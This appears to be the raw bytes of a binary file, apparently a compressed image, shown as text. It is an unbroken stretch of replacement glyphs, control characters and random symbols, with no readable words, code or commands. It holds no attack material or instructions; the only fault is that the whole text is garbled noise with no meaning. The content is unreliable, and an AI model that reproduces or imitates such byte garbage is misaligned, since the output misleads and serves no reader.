�`�s� T�ڌ�fq1n�bt��9��u �4J�ȸ5q1S s�I$D���B$�a�K��Y�����?��+��mi(txÀpJ4���0�`o5�_RS��Q�9�O�V�{l��F<3��O<�ଝ%�zp��lH �:� �Քh���$�c4�Bن �V7r�O-�]���(H��G������l�Jj �>��~��i$K��/s���iF[Iu ����K�]��a�\�m��5���<Ma��r���p��	pκ�#s�����v��*��/�t���p˻+NĞ%I�w12C����H�5��Ѩl$��ҹ+�Ca�*���V�КO�KtR(�Qn��2��p�0��[{y!U���Lj��(� T�Hb�c�$j私?(qw�B2�-Y�t���"VG�\��c*[f\����ob���4u���������[i.V4<���l�x�[�Έ"��Ƣ��v۩��m�+V�k@�n�zT	2�X�®���!�4N�C� ����2�D��b�""��2�}*����eb��:z0ʰ9.#��Dn�n#f<�{m���Eϸ*�l��jt���XkRü��
Q��0Z��Q	#��UD�����=.tX��-��N�یgnf�W�!��FK��N¤I�����7����K�|U��ͅ���"�fy�b �@v:v��x�~%�EK)�4�|�$&"�=_^�cm��
��I
j�e�(��К�ӳ
��T"��ݻ�,OL�{+i_^��I�o�T��}�R+������A�#�����u\r�7c L`�}x}ލ f6
F;�j�ovG�s��2�g�klҍ �����(�^6��76���W��ָ-��B(
��J2�@MNl.X�[ށi+Oo
O��
0T��P���bVf��V��8���Y�����&�Hgnd�lYM1���.N��;D�"�g����>o��]$��pt2����zWk���<�\4���s�l  նe�]#�a2�� �u��H�:ȩ�39� N��"���ә-�HOv���$��j[�kX#�^�VL?I�W����@."�hHu��[ �"��Ol�:�ٴR�#�,3��l�~���X�=�D�<ֶ�,�#���"��9lG�S���/�X��}B��"��Q"�m�k�[sBKx"hܳ&A>�?��1o�R�s�!)`E8�4H��� �;�U�����HR~nFig՝Y�g�����/���q�i�3)�W�ؓ�<Mni�W�Ko�A��2,��wq�r�ڠ��2�?,U���y��.a�n��ey�6�B2.Ho2j@"�R.f�4�.�A�rk���<�@1I1�-��#�5���hܴ̙����F~#��J�ϼ���%
UX�����70�$�-�T`��/�5�!hmf��.C�}�d��0�u�r�+�k�2A�e�'	��H
�P��Mu��ݳ��w0��p�5ˁ"�`������p�٥�")�R31b��-G��r&k{h&󑀒J�ki��.ƿ�
�&�h�8�%�xf�&i���b~Sp��iU�#�,�JT+��	��i�r@u�9��\�T� EˠA�������Xg��4��lB��h��'w�����J�;rEÐ��A{��_��L��தO@þ���&ȆW8F�x��;�1S��;O�*k�j�U���E��8[K8? Պ�L- 98,��8���*���$02@�R?,6���{�N�[i�"�2����t��Һ���%b,t�z�j�&���7������ȯ��ɒ���S����A���M������R�cBɅ�L�#.y�$# �b�|�Y�j� ��&Թ.���5T��.'�ΙcVq��~&�V�%=d�d|�M����*�X"^�8f�_A���dbϟ-��	#H�D��wf1�_��% `�u## U����h���Oʞ#�|��W
N#y�����bPg �5��R��Oξ�%�����B�<Y5�A#A��p��Ib�wdIXeԑ�)F�A�VȫU'��m���������#��m��n?1W��{$y���Y�+g>mZ]�ݵ�7���<Ȩ�*�7�[A1#L��b	��Ri 2j�>�Zb%��$N�
¸�ǣ[��Þ� x�I
5��Dem,�t��q8�׮6� c�nq�f��G.�UQ�$U��%�`7�ⷒ��bS�y7:�/�:��P���Z���||�����fT�|��8fG��NP���\���3�5X�a��+�h^	lK�2�S�{I懴�.`=�D��<B��R0|���PO��-���#��Z.r[NI ��9g(;؎�G�&�c=���Y#���+�6���>TG�uh`�y)�3�N�{J�H�N�Bطk��՝����r��0F`�������F�*��7�.0W a�ٵ�gPX��؞�g=�0� �a�l�C@�@��h�#,��|�ZC�
�2x�u���X��X�J�4����f�1P.s����{�5\���c�>f��Ă���̣쿟�TF9�r�F났:�I�� �23��"��]o$N�K��ԥ��y9?gJ~F�ُ�;�ʻ�9��X�+���8�T�yc
�NA+�\��&�����l"�jK�3m�{o���@^[�e$�a�z2�W��dJ��r�9�d��1쾬��qK��!��VӶݹ-��j�(�EUE���9�P
��e=U�؊E��T���_�1�:�q�Ҟ�����P?�G����GŤC��IX^�[^A��N�,�+F�)��$�Ȥ�n6�Ǒ�j�[i���+F�'�� ��`*���i[8�?��
�6�*��+?2wV;��"��f�czC����A��(t�Kg�S�g�u��2v���1�����v��0���r���8d�N
5����� �J�����a�Mg|jo��͍����B��jb7ș_H>aI��k!	��lH�^���8���d���3�C��� ��Y��cfS�sD�G�l���8;�]k�� �κ�wm�f�kv���<�*�Y�|*p��j��?��D��Юޡ��h� R�
�`��za8�*�H�H���n+����)r�$��R��@_�?��� %         !12PAa�"QR�� ? �j+[�$�,n�D>;̶i��l��m����5�#�Ϩ���w%]�bvK����i�3
/�0W�C�����:M����vq� ��2����4�!�O㷝�Z�� 3Mm�}��˷��5���=�uos"t�_i��̚����?��             1P!A�Q�� ? �n���!�%E�b���Ppw�M5V>��xT�>�-P�Bؼ"������^�N��!-��E��w���<����{n��